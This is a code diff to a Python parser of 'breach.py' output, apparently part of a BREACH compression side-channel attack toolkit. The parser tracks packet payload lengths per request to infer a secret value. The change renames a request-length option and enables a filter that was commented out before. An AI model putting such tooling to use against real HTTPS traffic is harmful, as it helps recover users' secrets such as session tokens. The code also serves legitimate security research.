@@ -51,7 +51,7 @@ parser = argparse.ArgumentParser(description='Parser of breach.py output')
 parser.add_argument('-a', metavar = 'alphabet', required = True, nargs = '+', help = 'Choose alphabet type (careful to use correct request order): n => digits, l => lowercase letters, u => uppercase letters')
 parser.add_argument('-m', metavar = 'mean_length', required = True, type = int, help = 'Input the (observed mean payload) length value of the packet')
 parser.add_argument('-lf', metavar = 'latest_file_number', type = int, help = 'Input the latest output file breach.py has created, -1 if first try')
-parser.add_argument('-r', metavar = 'request_length', type = int, help = 'Input the (mean payload) length of the request packet')
+parser.add_argument('-r', metavar = 'minimum_request_length', type = int, help = 'Input the minimum length of the request packet')
 parser.add_argument('-c', metavar = 'correct_value', help = 'Input the correct value we attack')
 parser.add_argument('-s', metavar = 'sampling', type = int, help = 'Input the sampling ratio')
 parser.add_argument('-t', metavar = 'refresh_time', type = int, help = 'Input the refresh time in seconds')
@@ -61,8 +61,9 @@ mean_length_large = args.m
 latest_file = -1
 if args.lf:
     latest_file = args.lf
+minimum_request_length = None
 if args.r:
-    request_length = args.r
+    minimum_request_length = args.r
 correct_val = None
 if args.c:
     correct_val = args.c
@@ -114,14 +115,13 @@ while 1:
                             f.write(r)
                         buff = []
                     pref, size = line.split(": ")
-                    '''
-                    if pref == "User application payload" and int(size) > request_length - 5 and int(size) < request_length + 5:
-                        if (curr_request != prev_request):
-                            buff.append("%d: -1\n" % prev_request)
-                            prev_request = prev_request + 1
-                        curr_request = curr_request + 1
-                        continue
-                    '''
+                    if minimum_request_length:
+                        if pref == "User application payload" and int(size) > minimum_request_length:
+                            if (curr_request != prev_request):
+                                buff.append("%d: -1\n" % prev_request)
+                                prev_request = prev_request + 1
+                            curr_request = curr_request + 1
+                            continue
                     if (pref == "Endpoint application payload"):
                         if int(size) > mean_length_large - 10 and int(size) < mean_length_large + 10:
                             summary = int(size)
